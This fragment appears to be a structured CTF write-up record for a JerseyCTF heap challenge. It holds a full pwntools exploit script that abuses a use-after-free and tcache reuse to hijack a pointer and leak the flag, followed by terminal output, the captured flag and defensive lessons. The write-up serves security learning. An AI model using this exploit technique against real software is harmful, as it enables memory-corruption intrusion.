      "code": "#!/usr/bin/env python3\nfrom pwn import *\n\nBIN_PATH = './roguecart'\nHOST = 'roguecart.aws.jerseyctf.com'\nPORT = 1337\n\ncontext.binary = BIN_PATH\n\n\ndef start(local=False):\n    if local:\n        return process(BIN_PATH)\n    return remote(HOST, PORT)\n\n\ndef choose(io, n):\n    io.sendlineafter(b'> ', str(n).encode())\n\n\ndef exploit(io):\n    # Step 1: Read heap pointer leak\n    io.recvuntil(b'[ SHUTTLE HANDLE: ')\n    shuttle_handle = int(io.recvuntil(b']', drop=True), 16)\n    print(f\"[*] Leak: serviceShuttle @ {hex(shuttle_handle)}\")\n\n    # Step 2: Calculate vaultChunk offset\n    # Heap layout from allocation order in primeShuttle():\n    # vaultChunk, spacerA, spacerB, serviceShuttle, serviceShuttle->relay\n    # Each user allocation is 0x40 bytes, glibc chunk stride is 0x50.\n    # So vaultChunk is 3 chunks before serviceShuttle.\n    vault_chunk = shuttle_handle - (3 * 0x50)\n    print(f\"[*] Calculated vaultChunk @ {hex(vault_chunk)}\")\n\n    # Step 3: Free serviceShuttle (dangling global pointer remains)\n    print(\"[*] Menu 1: Free serviceShuttle\")\n    choose(io, 1)\n\n    # Step 4: Allocate maintenanceBlob size 0x40\n    # This reuses the freed serviceShuttle chunk (tcache LIFO)\n    print(\"[*] Menu 2: Reallocate + Overwrite relay pointer\")\n    choose(io, 2)\n    io.recvuntil(b'[ FEED 64 BYTES OF PATCH DATA ]\\n')\n\n    # Step 5: Craft payload\n    # Overwrite serviceShuttle->relay pointer at offset 0x20 with vaultChunk\n    # This makes puts(serviceShuttle->relay) print the flag from vaultChunk\n    payload = b'A' * 0x20 + p64(vault_chunk)\n    payload = payload.ljust(0x40, b'B')\n    io.send(payload)\n    print(f\"[*] Payload sent: {len(payload)} bytes\")\n\n    # Step 6: Print relay (now points to vaultChunk containing flag)\n    print(\"[*] Menu 3: Print hijacked relay (points to vaultChunk)\")\n    choose(io, 3)\n    io.recvuntil(b'[ DISTRESS RELAY ]\\n')\n    flag = io.recvline().strip().decode(errors='ignore')\n    print(f\"[+] FLAG CAPTURED: {flag}\")\n    return flag\n\n\nif __name__ == '__main__':\n    io = start(local=args.LOCAL)\n    flag = exploit(io)\n    io.close()\n    print(f\"\\n[!] Final Flag: {flag}\")"
    }
  ],
  "terminalOutputs": [
    {
      "command": "checksec --file=roguecart",
      "output": "[*] '/path/to/roguecart'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE"
    },
    {
      "command": "python3 exploit.py",
      "output": "[*] Connecting to remote...\n[*] Leak: serviceShuttle @ 0x561e25c62310\n[*] Calculated vaultChunk @ 0x561e25c621c0\n[*] Executing UAF chain...\n[*] Menu 1: Free serviceShuttle\n[*] Menu 2: Reallocate + Overwrite relay pointer\n[*] Menu 3: Print hijacked relay (points to vaultChunk)\n[ DISTRESS RELAY ]\njctf{r09U3_cART_hE4p_H!j4Ck}\n[+] Flag captured!"
    }
  ],
  "flag": "jctf{r09U3_cART_hE4p_H!j4Ck}",
  "lessonsLearned": "**Always Null Pointers After Free**: After freeing memory, set the pointer to NULL immediately. Leaving dangling pointers is a critical mistake that enables UAF attacks. ALWAYS null after free().\n\n**Same-Size Allocations Enable Reuse**: When two objects are allocated with identical sizes, tcache immediately reuses freed chunks. This is the foundation for hijacking pointer fields in heap exploitation.\n\n**Missing Pointer Validation**: The object lacks magic numbers or version fields for pre-dereference validation. Trusted pointer dereference without checks is a critical vulnerability.\n\n**Information Leaks Break ASLR**: Leaking heap object addresses removes uncertainty about heap layout. Without leaks, attackers can only guess relative offsets.\n\n**Understand Heap Stride Calculations**: Understanding glibc's allocation strategy (0x40 user size → 0x50 stride) allows attackers to calculate inter-chunk offsets precisely. Reverse-engineer heap layout carefully.\n\n**Little-Endian Byte Order Matters**: When writing 64-bit pointers, byte order is critical. Use helper functions like p64() from pwntools to avoid manual encoding errors.\n\n**Lifecycle Enforcement is Essential**: The application doesn't validate that objects remain valid before using them in different menu branches. Implement proper state machines for object lifecycle management.\n\n**Partial Protections Are Insufficient**: While Canary and NX are present, full ASLR is not enabled (No PIE). Combining information leaks with UAF remains extremely powerful despite partial protections."
}];